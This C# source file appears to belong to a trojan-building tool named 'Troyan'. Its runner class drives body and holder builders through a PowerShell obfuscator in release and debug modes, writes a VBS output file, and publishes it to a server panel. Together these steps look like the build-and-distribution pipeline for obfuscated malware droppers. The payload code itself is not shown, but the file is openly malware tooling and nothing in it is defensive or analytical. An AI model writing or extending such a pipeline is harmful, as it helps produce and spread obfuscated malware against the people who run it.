using Commons;

namespace Troyan.Core;

public sealed class TroyanBuildRunner : ITroyanBuildRunner
{
    private readonly IPowerShellObfuscator _obfuscator;
    private readonly ITroyanPlainVbsEmitter _plainVbs;

    public TroyanBuildRunner(IPowerShellObfuscator obfuscator, ITroyanPlainVbsEmitter plainVbs)
    {
        _obfuscator = obfuscator;
        _plainVbs = plainVbs;
    }

    public void Run(string server, string packId, ServerService panelService)
    {
        CustomBuilder[] steps =
        {
            new BodyBuilder(TroyanBuildMode.Release, _obfuscator),
            new BodyBuilder(TroyanBuildMode.Debug, _obfuscator),
            new HolderBuilder(TroyanBuildMode.Release, _obfuscator),
            new HolderBuilder(TroyanBuildMode.Debug, _obfuscator),
        };

        foreach (var cb in steps)
        {
            Console.WriteLine(cb);
            var result = cb.Build(server, packId, panelService);
            foreach (var line in result)
                Console.WriteLine(line);
        }

        var layout = panelService.Layout();
        _plainVbs.Write(layout);
        Console.WriteLine("VBS (_output): " + layout.TroyanOutputVbs);
        panelService.PublishTroyanVbsFromBuildOutput(layout);
    }
}
